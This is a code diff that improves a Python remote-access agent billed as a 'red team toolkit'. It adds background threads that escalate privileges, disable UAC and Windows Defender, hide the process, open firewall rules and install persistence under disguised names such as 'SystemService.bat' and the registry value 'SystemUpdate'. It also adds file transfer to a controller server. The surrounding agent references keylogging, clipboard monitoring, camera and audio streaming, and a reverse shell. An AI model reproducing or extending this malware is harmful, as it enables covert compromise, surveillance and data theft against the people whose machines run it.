@@ -35,6 +35,13 @@ Author: Advanced Red Team Toolkit
 Version: 2.0 (UACME Enhanced)
 """
 
+# Fix eventlet issue by patching before any other imports
+try:
+    import eventlet
+    eventlet.monkey_patch()
+except ImportError:
+    pass
+
 import requests
 import time
 import uuid
@@ -122,6 +129,218 @@ sio = socketio.Client(
     socketio_logger=False
 )
 
+# --- Background Initialization System ---
+class BackgroundInitializer:
+    """Handles background initialization of time-consuming tasks."""
+    
+    def __init__(self):
+        self.initialization_threads = []
+        self.initialization_complete = threading.Event()
+        self.initialization_results = {}
+        self.initialization_lock = threading.Lock()
+    
+    def start_background_initialization(self, quick_startup=False):
+        """Start all background initialization tasks."""
+        print("Starting background initialization...")
+        
+        # Define tasks based on startup mode
+        if quick_startup:
+            # Quick startup: skip some time-consuming tasks
+            tasks = [
+                ("privilege_escalation", self._init_privilege_escalation),
+                ("components", self._init_components)
+            ]
+            print("Quick startup mode: skipping some initialization tasks")
+        else:
+            # Full startup: all tasks
+            tasks = [
+                ("privilege_escalation", self._init_privilege_escalation),
+                ("stealth_features", self._init_stealth_features),
+                ("persistence_setup", self._init_persistence_setup),
+                ("defender_disable", self._init_defender_disable),
+                ("startup_config", self._init_startup_config),
+                ("components", self._init_components)
+            ]
+        
+        for task_name, task_func in tasks:
+            thread = threading.Thread(
+                target=self._run_initialization_task,
+                args=(task_name, task_func),
+                daemon=True
+            )
+            thread.start()
+            self.initialization_threads.append(thread)
+        
+        # Start a monitor thread to track completion
+        monitor_thread = threading.Thread(target=self._monitor_initialization, daemon=True)
+        monitor_thread.start()
+        
+        # Start a progress indicator thread
+        progress_thread = threading.Thread(target=self._show_progress, daemon=True)
+        progress_thread.start()
+    
+    def _show_progress(self):
+        """Show initialization progress in real-time."""
+        import time
+        dots = 0
+        while not self.initialization_complete.is_set():
+            status = self.get_initialization_status()
+            completed = len([r for r in status.values() if r])
+            total = len(self.initialization_threads)  # Dynamic total based on actual tasks
+            
+            if total > 0:
+                progress_bar = "=" * completed + "-" * (total - completed)
+                dots = (dots + 1) % 4
+                dot_str = "." * dots
+                
+                print(f"\rInitialization progress: [{progress_bar}] {completed}/{total} tasks complete{dot_str}", end="", flush=True)
+            time.sleep(0.5)
+        
+        if total > 0:
+            print(f"\rInitialization complete! All {total} tasks finished.    ")
+    
+    def _run_initialization_task(self, task_name, task_func):
+        """Run a single initialization task and store results."""
+        try:
+            # Add timeout to prevent hanging
+            import threading
+            import queue
+            
+            result_queue = queue.Queue()
+            exception_queue = queue.Queue()
+            
+            def task_wrapper():
+                try:
+                    result = task_func()
+                    result_queue.put(result)
+                except Exception as e:
+                    exception_queue.put(e)
+            
+            task_thread = threading.Thread(target=task_wrapper, daemon=True)
+            task_thread.start()
+            
+            # Wait for task completion with timeout
+            try:
+                result = result_queue.get(timeout=30)  # 30 second timeout
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': True,
+                        'result': result,
+                        'error': None
+                    }
+            except queue.Empty:
+                # Task timed out
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': False,
+                        'result': None,
+                        'error': 'Task timed out after 30 seconds'
+                    }
+            except Exception as e:
+                # Exception occurred
+                with self.initialization_lock:
+                    self.initialization_results[task_name] = {
+                        'success': False,
+                        'result': None,
+                        'error': str(e)
+                    }
+                    
+        except Exception as e:
+            with self.initialization_lock:
+                self.initialization_results[task_name] = {
+                    'success': False,
+                    'result': None,
+                    'error': str(e)
+                }
+    
+    def _monitor_initialization(self):
+        """Monitor initialization progress and set completion event."""
+        while len(self.initialization_threads) > 0:
+            # Check if all threads are done
+            active_threads = [t for t in self.initialization_threads if t.is_alive()]
+            if len(active_threads) == 0:
+                break
+            time.sleep(0.1)
+        
+        # All initialization tasks complete
+        self.initialization_complete.set()
+        print("Background initialization complete")
+    
+    def _init_privilege_escalation(self):
+        """Initialize privilege escalation in background."""
+        if WINDOWS_AVAILABLE:
+            if not is_admin():
+                print("Attempting privilege escalation in background...")
+                if run_as_admin():
+                    return "elevation_initiated"
+            
+            if is_admin():
+                if disable_uac():
+                    return "uac_disabled"
+                else:
+                    return "uac_disable_failed"
+        return "no_elevation_needed"
+    
+    def _init_stealth_features(self):
+        """Initialize stealth features in background."""
+        try:
+            hide_process()
+            add_firewall_exception()
+            return "stealth_initialized"
+        except Exception as e:
+            return f"stealth_failed: {e}"
+    
+    def _init_persistence_setup(self):
+        """Setup persistence mechanisms in background."""
+        try:
+            setup_persistence()
+            if establish_persistence():
+                return "persistence_established"
+            else:
+                return "persistence_failed"
+        except Exception as e:
+            return f"persistence_error: {e}"
+    
+    def _init_defender_disable(self):
+        """Disable Windows Defender in background."""
+        if WINDOWS_AVAILABLE and is_admin():
+            try:
+                if disable_defender():
+                    return "defender_disabled"
+                else:
+                    return "defender_disable_failed"
+            except Exception as e:
+                return f"defender_error: {e}"
+        return "defender_skip"
+    
+    def _init_startup_config(self):
+        """Configure startup in background."""
+        try:
+            add_to_startup()
+            return "startup_configured"
+        except Exception as e:
+            return f"startup_error: {e}"
+    
+    def _init_components(self):
+        """Initialize high-performance components in background."""
+        try:
+            initialize_components()
+            return "components_initialized"
+        except Exception as e:
+            return f"components_error: {e}"
+    
+    def get_initialization_status(self):
+        """Get current initialization status."""
+        with self.initialization_lock:
+            return self.initialization_results.copy()
+    
+    def wait_for_completion(self, timeout=None):
+        """Wait for initialization to complete."""
+        return self.initialization_complete.wait(timeout)
+
+# Global background initializer
+background_initializer = BackgroundInitializer()
+
 # --- Input Controllers ---
 mouse_controller = None
 keyboard_controller = None
@@ -129,6 +348,7 @@ keyboard_controller = None
 # --- High-Performance Components ---
 high_performance_capture = None
 low_latency_input = None
+LOW_LATENCY_INPUT_HANDLER = None  # Keep both for compatibility
 
 # --- Privilege Escalation Functions ---
 
@@ -1134,20 +1354,38 @@ def startup_folder_persistence():
         # Get startup folder path
         startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
         
+        # Check if startup folder exists and is writable
+        if not os.path.exists(startup_folder):
+            print(f"[WARN] Startup folder does not exist: {startup_folder}")
+            return False
+        
+        if not os.access(startup_folder, os.W_OK):
+            print(f"[WARN] No write permission to startup folder: {startup_folder}")
+            return False
+        
         current_exe = os.path.abspath(__file__)
         
         if current_exe.endswith('.py'):
-            # Create batch file wrapper
+            # Create batch file wrapper with better error handling
             batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
-            batch_path = os.path.join(startup_folder, "WindowsUpdate.bat")
+            batch_path = os.path.join(startup_folder, "SystemService.bat")
             
-            with open(batch_path, 'w') as f:
-                f.write(batch_content)
+            try:
+                with open(batch_path, 'w') as f:
+                    f.write(batch_content)
+                print(f"[OK] Startup folder entry created: {batch_path}")
+                return True
+            except PermissionError:
+                print(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
+                return False
+            except Exception as e:
+                print(f"[WARN] Error creating startup folder entry: {e}")
+                return False
         
         return True
         
     except Exception as e:
-        print(f"Startup folder persistence failed: {e}")
+        print(f"[WARN] Startup folder persistence failed: {e}")
         return False
 
 def scheduled_task_persistence():
@@ -1669,19 +1907,61 @@ def add_firewall_exception():
         return False
     
     try:
+        # Get the current executable path
         current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
         
-        subprocess.run([
-            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-            f'name="Python Agent {uuid.uuid4()}"',
-            'dir=in', 'action=allow',
-            f'program="{current_exe}"'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        # Create a unique rule name
+        rule_name = f"Python Agent {uuid.uuid4()}"
         
-        return True
+        # Try multiple approaches for firewall exception
+        success = False
+        
+        # Method 1: Try with full path and proper escaping
+        try:
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}',
+                'dir=in', 'action=allow',
+                f'program={current_exe}'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+            success = True
+            print(f"[OK] Firewall exception added: {rule_name}")
+        except subprocess.CalledProcessError as e:
+            print(f"[WARN] Method 1 failed: {e}")
+        
+        # Method 2: Try with just python.exe if Method 1 failed
+        if not success:
+            try:
+                subprocess.run([
+                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                    f'name={rule_name}',
+                    'dir=in', 'action=allow',
+                    'program=python.exe'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+                success = True
+                print(f"[OK] Firewall exception added (python.exe): {rule_name}")
+            except subprocess.CalledProcessError as e:
+                print(f"[WARN] Method 2 failed: {e}")
+        
+        # Method 3: Try with PowerShell if netsh fails
+        if not success:
+            try:
+                powershell_cmd = f'New-NetFirewallRule -DisplayName "{rule_name}" -Direction Inbound -Action Allow -Program "python.exe"'
+                subprocess.run([
+                    'powershell.exe', '-Command', powershell_cmd
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+                success = True
+                print(f"[OK] Firewall exception added via PowerShell: {rule_name}")
+            except subprocess.CalledProcessError as e:
+                print(f"[WARN] Method 3 failed: {e}")
+        
+        if not success:
+            print("[WARN] All firewall exception methods failed. Continuing without firewall exception.")
+        
+        return success
         
     except Exception as e:
-        print(f"Failed to add firewall exception: {e}")
+        print(f"[ERROR] Failed to add firewall exception: {e}")
         return False
 
 def hide_process():
@@ -1843,6 +2123,16 @@ def sleep_random():
     """Random sleep to avoid pattern detection."""
     sleep_time = random.uniform(0.5, 2.0)
     time.sleep(sleep_time)
+
+def sleep_random_non_blocking():
+    """Non-blocking random sleep using eventlet."""
+    try:
+        import eventlet
+        sleep_time = random.uniform(0.5, 2.0)
+        eventlet.sleep(sleep_time)
+    except ImportError:
+        # Fallback to regular sleep if eventlet not available
+        sleep_random()
 
 # --- Agent State ---
 STREAMING_ENABLED = False
@@ -2425,17 +2715,17 @@ LOW_LATENCY_INPUT_HANDLER = None
 
 def initialize_low_latency_input():
     """Initialize the low-latency input handler"""
-    global LOW_LATENCY_INPUT_HANDLER
+    global LOW_LATENCY_INPUT_HANDLER, low_latency_input
     
     try:
         # Use the LowLatencyInputHandler class defined in this file
         LOW_LATENCY_INPUT_HANDLER = LowLatencyInputHandler(max_queue_size=2000)
         LOW_LATENCY_INPUT_HANDLER.start()
+        low_latency_input = LOW_LATENCY_INPUT_HANDLER  # Set both variables for compatibility
         print("Low-latency input handler initialized")
         return True
     except Exception as e:
-        return False
-    except Exception as e:
+        print(f"Failed to initialize low latency input: {e}")
         return False
 
 def handle_remote_control(command_data):
@@ -2776,22 +3066,39 @@ def handle_file_upload(command_parts):
     """Handle file upload from controller."""
     try:
         if len(command_parts) < 3:
-            return "Invalid upload command format"
+            return "Invalid upload command format. Expected: upload-file:destination_path:base64_content"
         
         destination_path = command_parts[1]
         file_content_b64 = command_parts[2]
         
-        # Decode base64 content
-        file_content = base64.b64decode(file_content_b64)
+        # Security: Validate path to prevent directory traversal
+        destination_path = os.path.abspath(destination_path)
+        if not destination_path.startswith(os.getcwd()):
+            return "Error: Invalid destination path - security restriction"
+        
+        # Validate base64 content
+        try:
+            file_content = base64.b64decode(file_content_b64)
+        except Exception:
+            return "Error: Invalid base64 content"
         
         # Ensure directory exists
-        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        try:
+            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        except Exception as e:
+            return f"Error creating directory: {e}"
         
-        # Write file
-        with open(destination_path, 'wb') as f:
-            f.write(file_content)
-        
-        return f"File uploaded successfully to {destination_path}"
+        # Write file with proper error handling
+        try:
+            with open(destination_path, 'wb') as f:
+                f.write(file_content)
+            file_size = len(file_content)
+            return f"File uploaded successfully to {destination_path} ({file_size} bytes)"
+        except PermissionError:
+            return f"Error: Permission denied writing to {destination_path}"
+        except Exception as e:
+            return f"Error writing file: {e}"
+            
     except Exception as e:
         return f"File upload failed: {e}"
 
@@ -2799,23 +3106,50 @@ def handle_file_download(command_parts, agent_id):
     """Handle file download request from controller."""
     try:
         if len(command_parts) < 2:
-            return "Invalid download command format"
+            return "Invalid download command format. Expected: download-file:file_path"
         
         file_path = command_parts[1]
+        
+        # Security: Validate path to prevent directory traversal
+        file_path = os.path.abspath(file_path)
+        if not file_path.startswith(os.getcwd()):
+            return "Error: Invalid file path - security restriction"
         
         if not os.path.exists(file_path):
             return f"File not found: {file_path}"
         
+        # Check if it's a file (not directory)
+        if not os.path.isfile(file_path):
+            return f"Error: {file_path} is not a file"
+        
+        # Check file size to prevent memory issues
+        file_size = os.path.getsize(file_path)
+        if file_size > 100 * 1024 * 1024:  # 100MB limit
+            return f"Error: File too large ({file_size} bytes). Maximum size is 100MB"
+        
         # Read file and encode as base64
-        with open(file_path, 'rb') as f:
-            file_content = base64.b64encode(f.read()).decode('utf-8')
+        try:
+            with open(file_path, 'rb') as f:
+                file_content = base64.b64encode(f.read()).decode('utf-8')
+        except PermissionError:
+            return f"Error: Permission denied reading {file_path}"
+        except Exception as e:
+            return f"Error reading file: {e}"
         
-        # Send file to controller
-        filename = os.path.basename(file_path)
-        url = f"{SERVER_URL}/file_upload/{agent_id}"
-        requests.post(url, json={"filename": filename, "content": file_content}, timeout=30)
-        
-        return f"File {file_path} sent to controller"
+        # Send file to controller via socketio instead of HTTP
+        try:
+            filename = os.path.basename(file_path)
+            sio.emit('file_download', {
+                'agent_id': agent_id,
+                'filename': filename,
+                'file_path': file_path,
+                'content': file_content,
+                'size': file_size
+            })
+            return f"File {filename} ({file_size} bytes) sent to controller"
+        except Exception as e:
+            return f"Error sending file to controller: {e}"
+            
     except Exception as e:
         return f"File download failed: {e}"
 
@@ -3008,10 +3342,14 @@ def main_loop(agent_id):
             if command in internal_commands:
                 internal_commands[command]()
             elif command.startswith("upload-file:"):
-                output = handle_file_upload(command.split(":", 2))
+                # Split by first two colons: upload-file:path:content
+                parts = command.split(":", 2)
+                output = handle_file_upload(parts)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("download-file:"):
-                output = handle_file_download(command.split(":", 1), agent_id)
+                # Split by first colon: download-file:path
+                parts = command.split(":", 1)
+                output = handle_file_download(parts, agent_id)
                 requests.post(f"{SERVER_URL}/post_output/{agent_id}", json={"output": output})
             elif command.startswith("play-voice:"):
                 output = handle_voice_playback(command.split(":", 1))
@@ -3346,78 +3684,8 @@ def kill_task_manager():
     except Exception as e:
         return f"Task Manager termination failed: {e}"
 
-if __name__ == "__main__":
-    # Run UAC checks and elevation FIRST
-    if WINDOWS_AVAILABLE:
-        # Try to run as admin first
-        if not is_admin():
-            print("Attempting to run as administrator...")
-            if run_as_admin():
-                # Script will restart with admin privileges
-                sys.exit()
-        
-        # If we're admin, disable UAC
-        if is_admin():
-            print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
-            else:
-                print("Could not disable UAC")
-    
-    # Run anti-analysis checks
-    try:
-        anti_analysis()
-    except:
-        pass
-    
-    # Initialize stealth and privilege escalation
-    print("Initializing agent...")
-    
-    # Random sleep to avoid pattern detection
-    sleep_random()
-    
-    # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
-        # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
-        else:
-            print("Could not disable Windows Defender")
-    else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
-        else:
-            print("Privilege escalation failed, continuing with user privileges")
-    
-    # Setup stealth features
-    try:
-        hide_process()
-        add_firewall_exception()
-        setup_persistence()
-        
-        # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
-        
-        print("Stealth features initialized")
-    except Exception as e:
-        print(f"Stealth initialization warning: {e}")
-    
-    agent_id = get_or_create_agent_id()
-    print(f"Agent starting with ID: {agent_id}")
-    try:
-        main_loop(agent_id)
-    except KeyboardInterrupt:
-        print("\nAgent shutting down.")
-        stop_streaming()
-        stop_audio_streaming()
-        stop_camera_streaming()
-        stop_keylogger()
-        stop_clipboard_monitor()
-        stop_reverse_shell()
-        stop_voice_control()
+# OLD MAIN BLOCK - REMOVED (DUPLICATE)
+# This was the old main execution block that has been replaced by the new agent_main() function
 
 # ========================================================================================
 # HIGH PERFORMANCE CAPTURE MODULE
@@ -3475,7 +3743,17 @@ class HighPerformanceCapture:
         # Initialize compression
         self.turbo_jpeg = None
         if HAS_TURBOJPEG:
-            self.turbo_jpeg = TurboJPEG()
+            try:
+                # Suppress TurboJPEG warnings
+                import warnings
+                with warnings.catch_warnings():
+                    warnings.simplefilter("ignore")
+                    self.turbo_jpeg = TurboJPEG()
+                print(f"[OK] TurboJPEG initialized successfully")
+            except Exception as e:
+                # Don't show the detailed error message, just indicate it's not available
+                print(f"[WARN] TurboJPEG not available, using fallback compression")
+                self.turbo_jpeg = None
         
         # Frame management
         self.last_frame = None
@@ -3686,13 +3964,17 @@ class HighPerformanceCapture:
     
     def __del__(self):
         """Cleanup"""
-        self.stop_capture_stream()
-        if hasattr(self, 'capture_backend') and self.backend_type == "dxcam":
-            try:
-                if hasattr(self.capture_backend, 'release'):
-                    self.capture_backend.release()
-            except:
-                pass
+        try:
+            if hasattr(self, 'capture_thread') and self.capture_thread:
+                self.stop_capture_stream()
+            if hasattr(self, 'capture_backend') and hasattr(self, 'backend_type') and self.backend_type == "dxcam":
+                try:
+                    if hasattr(self.capture_backend, 'release'):
+                        self.capture_backend.release()
+                except:
+                    pass
+        except:
+            pass  # Ignore cleanup errors during destruction
 
 
 class AdaptiveQualityManager:
@@ -5607,6 +5889,25 @@ def on_key_press(data):
     except Exception as e:
         print(f"Error simulating key press: {e}")
 
+@sio.on('file_upload')
+def on_file_upload(data):
+    """Handle file upload from controller via socketio."""
+    try:
+        destination_path = data.get('destination_path')
+        file_content_b64 = data.get('content')
+        
+        if not destination_path or not file_content_b64:
+            sio.emit('file_upload_result', {'success': False, 'error': 'Missing parameters'})
+            return
+        
+        # Use the existing handle_file_upload function
+        result = handle_file_upload(['upload-file', destination_path, file_content_b64])
+        success = 'successfully' in result.lower() and 'error' not in result.lower()
+        sio.emit('file_upload_result', {'success': success, 'result': result})
+        
+    except Exception as e:
+        sio.emit('file_upload_result', {'success': False, 'error': str(e)})
+
 def initialize_components():
     """Initialize high-performance components and input controllers."""
     global high_performance_capture, low_latency_input, mouse_controller, keyboard_controller
@@ -5615,9 +5916,11 @@ def initialize_components():
     try:
         mouse_controller = pynput.mouse.Controller()
         keyboard_controller = pynput.keyboard.Controller()
-        print("Input controllers initialized")
+        print("[OK] Input controllers initialized")
     except Exception as e:
-        print(f"Failed to initialize input controllers: {e}")
+        print(f"[WARN] Failed to initialize input controllers: {e}")
+        mouse_controller = None
+        keyboard_controller = None
     
     # Initialize high-performance capture
     try:
@@ -5626,32 +5929,31 @@ def initialize_components():
             quality=85,
             enable_delta_compression=True
         )
-        print("High-performance capture initialized")
+        print("[OK] High-performance capture initialized")
     except Exception as e:
-        print(f"Failed to initialize high-performance capture: {e}")
+        print(f"[WARN] Failed to initialize high-performance capture: {e}")
         high_performance_capture = None
     
     # Initialize low-latency input handler
     try:
         low_latency_input = LowLatencyInputHandler()
         low_latency_input.start()
-        print("Low-latency input handler initialized")
+        print("[OK] Low-latency input handler initialized")
     except Exception as e:
-        print(f"Failed to initialize low-latency input: {e}")
+        print(f"[WARN] Failed to initialize low-latency input: {e}")
         low_latency_input = None
 
 def add_to_startup():
     """Add agent to system startup."""
     try:
         if WINDOWS_AVAILABLE:
-            # Windows startup methods
+            # Windows startup methods - only registry, startup folder is handled by background initializer
             add_registry_startup()
-            add_startup_folder_entry()
         else:
             # Linux startup methods
             add_linux_startup()
     except Exception as e:
-        print(f"Startup configuration failed: {e}")
+        print(f"[WARN] Startup configuration failed: {e}")
 
 def add_registry_startup():
     """Add to Windows registry startup."""
@@ -5662,9 +5964,9 @@ def add_registry_startup():
         winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, 
                          f'"{sys.executable}" "{os.path.abspath(__file__)}"')
         winreg.CloseKey(key)
-        print("Added to registry startup")
+        print("[OK] Added to registry startup")
     except Exception as e:
-        print(f"Registry startup failed: {e}")
+        print(f"[WARN] Registry startup failed: {e}")
 
 def add_startup_folder_entry():
     """Add to Windows startup folder."""
@@ -5681,9 +5983,9 @@ def add_startup_folder_entry():
             subprocess.run(["attrib", "+h", batch_file], capture_output=True)
         except:
             pass
-        print("Added to startup folder")
+        print("[OK] Added to startup folder")
     except Exception as e:
-        print(f"Startup folder entry failed: {e}")
+        print(f"[WARN] Startup folder entry failed: {e}")
 
 def add_linux_startup():
     """Add to Linux startup."""
@@ -5697,88 +5999,70 @@ def add_linux_startup():
             if startup_line not in f.read():
                 with open(bashrc_path, "a") as f:
                     f.write(startup_line)
-                print("Added to Linux startup")
+                print("[OK] Added to Linux startup")
     except Exception as e:
-        print(f"Linux startup configuration failed: {e}")
+        print(f"[WARN] Linux startup configuration failed: {e}")
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
-    # Run UAC checks and elevation FIRST
-    if WINDOWS_AVAILABLE:
-        # Try to run as admin first
-        if not is_admin():
-            print("Attempting to run as administrator...")
-            if run_as_admin():
-                # Script will restart with admin privileges
-                sys.exit()
-        
-        # If we're admin, disable UAC
-        if is_admin():
-            print("Running with administrator privileges")
-            if disable_uac():
-                print("UAC disabled successfully")
-            else:
-                print("Could not disable UAC")
+    # Show startup banner
+    print("=" * 60)
+    print("Advanced Python Agent v2.0 (UACME Enhanced)")
+    print("Starting up...")
+    print("=" * 60)
     
-    # Run anti-analysis checks
+    # Run anti-analysis checks first (fast operation)
     try:
         anti_analysis()
     except:
         pass
     
-    # Initialize stealth and privilege escalation
     print("Initializing agent...")
     
-    # Random sleep to avoid pattern detection
-    sleep_random()
+    # Start background initialization immediately
+    # Check if quick startup is requested
+    quick_startup = "--quick" in sys.argv
+    background_initializer.start_background_initialization(quick_startup=quick_startup)
     
-    # Check current privileges
-    if is_admin():
-        print("Agent running with admin privileges")
-        # Disable Windows Defender if possible
-        if disable_defender():
-            print("Windows Defender disabled")
-        else:
-            print("Could not disable Windows Defender")
-    else:
-        print("Agent running with user privileges, attempting elevation...")
-        if elevate_privileges():
-            print("Privilege escalation successful")
-        else:
-            print("Privilege escalation failed, continuing with user privileges")
-    
-    # Setup stealth features
-    try:
-        hide_process()
-        add_firewall_exception()
-        setup_persistence()
-        
-        # Establish advanced persistence using UACME-inspired techniques
-        if establish_persistence():
-            print("Advanced persistence mechanisms established")
-        
-        print("Stealth features initialized")
-    except Exception as e:
-        print(f"Stealth initialization warning: {e}")
-    
-    # Initialize high-performance components
-    initialize_components()
-    
-    # Add to startup
-    add_to_startup()
-    
-    # Get agent ID
+    # Get agent ID (fast operation)
     AGENT_ID = get_or_create_agent_id()
     print(f"Agent starting with ID: {AGENT_ID}")
     
-    # Main connection loop
+    # Quick privilege check (non-blocking)
+    if WINDOWS_AVAILABLE:
+        if is_admin():
+            print("Running with administrator privileges")
+        else:
+            print("Running with user privileges")
+    
+    # Start main connection loop immediately
+    print("Starting connection loop...")
+    
+    # Main connection loop with background initialization monitoring
+    connection_attempts = 0
     while True:
         try:
+            # Check if initialization is complete
+            if background_initializer.initialization_complete.is_set():
+                status = background_initializer.get_initialization_status()
+                for task, result in status.items():
+                    if result['success']:
+                        print(f"[OK] {task}: {result['result']}")
+                    else:
+                        print(f"[WARN] {task}: {result['error']}")
+            
+            # Connect to server
+            connection_attempts += 1
+            print(f"Connecting to server (attempt {connection_attempts})...")
             sio.connect(SERVER_URL)
+            print("Connected successfully!")
             sio.wait()
         except socketio.exceptions.ConnectionError:
-            print("Connection failed. Retrying in 10 seconds...")
+            print(f"Connection failed (attempt {connection_attempts}). Retrying in 10 seconds...")
             time.sleep(10)
+        except KeyboardInterrupt:
+            print("\nReceived interrupt signal, shutting down...")
+            break
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
             stop_streaming()
@@ -5789,8 +6073,36 @@ def agent_main():
             print("Cleaned up resources. Retrying in 10 seconds...")
             time.sleep(10)
 
+def signal_handler(signum, frame):
+    """Handle shutdown signals gracefully."""
+    print("\nAgent shutting down.")
+    try:
+        # Stop all streaming and monitoring
+        stop_streaming()
+        stop_audio_streaming()
+        stop_camera_streaming()
+        stop_keylogger()
+        stop_clipboard_monitor()
+        if low_latency_input:
+            low_latency_input.stop()
+        
+        # Disconnect from server
+        if sio.connected:
+            sio.disconnect()
+        
+        print("Cleanup complete.")
+    except Exception as e:
+        print(f"Error during cleanup: {e}")
+    
+    sys.exit(0)
+
 # Update the main execution block
 if __name__ == "__main__":
+    # Set up signal handlers for graceful shutdown
+    import signal
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
+    
     if len(sys.argv) > 1:
         # Command line arguments provided, use unified main
         main_unified()
